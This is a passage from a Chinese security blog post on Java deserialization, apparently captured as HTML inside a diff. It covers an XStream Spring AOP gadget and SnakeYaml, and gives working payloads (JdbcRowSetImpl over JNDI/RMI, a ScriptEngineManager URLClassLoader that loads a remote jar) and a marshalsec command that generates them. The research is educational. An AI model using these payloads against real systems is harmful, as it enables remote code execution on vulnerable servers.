+    &lt;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor serialization=&quot;custom&quot;&gt;
+      &lt;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;
+        &lt;default/&gt;
+      &lt;/org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&gt;
+      &lt;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&gt;
+        &lt;default&gt;
+          &lt;pointcut class=&quot;org.springframework.aop.TruePointcut&quot; reference=&quot;../../../../../entry/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor/default/pointcut&quot;/&gt;
+        &lt;/default&gt;
+      &lt;/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&gt;
+    &lt;/org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&gt;
+    &lt;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor reference=&quot;../org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre><p>SpringAbstractBeanFactoryPointcutAdvisor 同样是利用 JNDI 执行代码，需要有 spring aop 的依赖，可影响到 1.4.11 最新版本。</p><h1>SnakeYaml</h1><p>大多数 java 项目用来处理数据基本上都是 xml 和 json 两种格式，yaml 相对来说少见一点，在我做过的一些代码审计项目里，使用 yaml 处理库最常见的就是 SnakeYaml，虽然还有 jyaml、YAMLBeans 之类的库，但我在真实环境里挺少有见到使用的。</p><h4>使用方法</h4><p>先导入 snakeyaml 依赖</p><pre><code>&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.yaml&lt;/groupId&gt;
+    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
+    &lt;version&gt;1.17&lt;/version&gt;
+&lt;/dependency&gt;</code></pre><p>然后输出序列化一个 javabean</p><pre><code>    Yaml yaml = new Yaml();
+    Person person = new Person();
+    person.name=&quot;giao&quot;;
+    person.length=18;
+    String dump = yaml.dump(person);
+    System.out.println(dump);
+</code></pre><p>输出结果为 <code>!!simple.Person {length: 18, name: giao}</code></p><p><code>!!</code>后面跟全类名，<code>{}</code>里是属性名和属性值，中间使用逗号分隔。</p><p>其实跟 jackson 和 fastjson 没啥区别。</p><p>特点在于它没有黑名单，不能设置私有属性，不能使用构造方法触发的 gadgets。</p><p>所以在 jackson、fastjson 这些 unmarshal 一类的 gadgets 大部分都可以拿来就用。</p><p>比如最常见的<code>JdbcRowSetImpl</code>。</p><pre><code>!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:2333/exp', autoCommit: true}</code></pre><p>注意在构造 payload 的时候，该留空格的地方要留空格，snakeyaml 对格式校验比较严格，不然会报错。</p><p><img src="/usr/uploads/2019/11/2603590606.jpg" alt="1573828615(1).jpg" title="1573828615(1).jpg"></p><p>反序列化利用工具 marshalsec 也提供了 snakeyaml 的一些 gadgets。</p><blockquote><p>[SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean, CommonsConfiguration, C3P0WrapperConnPool, C3P0RefDataSource, JdbcRowSet, ScriptEngine, ResourceGadget]</p></blockquote><p>大多数都是利用 JNDI 执行代码的，jdk 的有一个 ScriptEngine ，利用的是远程加载 jar 包。</p><blockquote><p>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.SnakeYAML ScriptEngine <a href="http://127.0.0.1" target="_blank">http://127.0.0.1</a>:2333/</p></blockquote><pre><code>!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:2333/&quot;]]]]</code></pre><p><img src="/usr/uploads/2019/11/1911537488.jpg" alt="1573829181(1).jpg" title="1573829181(1).jpg"></p><h1>总结</h1><p>没得总结，懒得写了，就这样吧！</p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-239" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/239.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/239.html#respond-post-239" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
